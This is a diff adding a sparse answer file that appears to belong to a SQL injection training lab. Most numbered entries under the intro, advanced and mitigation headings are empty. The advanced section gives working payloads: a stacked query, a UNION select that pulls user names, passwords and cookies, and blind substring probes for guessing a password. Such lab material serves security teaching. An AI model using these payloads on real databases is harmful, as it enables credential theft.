@@ -1,0 +1,43 @@
+SQL injection (intro):
+--------------------------
+2.
+3.
+4.
+5.
+9.
+10.
+11.
+12.
+13.
+
+
+
+SQL injection (advanced):
+--------------------------
+3.a)temp'; SELECT * FROM user_system_data; -- 
+	temp' union select userid,user_name,password,cookie, null as c5, null as c6, null as c7 from user_system_data -- 
+	
+
+5.
+tom' length(password)>=23
+tom' and substring(password,1[position],1[length])='a
+tom' and substring(password,1,1)='t
+
+
+6.
+
+
+
+SQL injection (mitigation):
+--------------------------
+2.
+3.
+4.
+5.
+9.
+10.
+11.
+12.
+13.
+
+
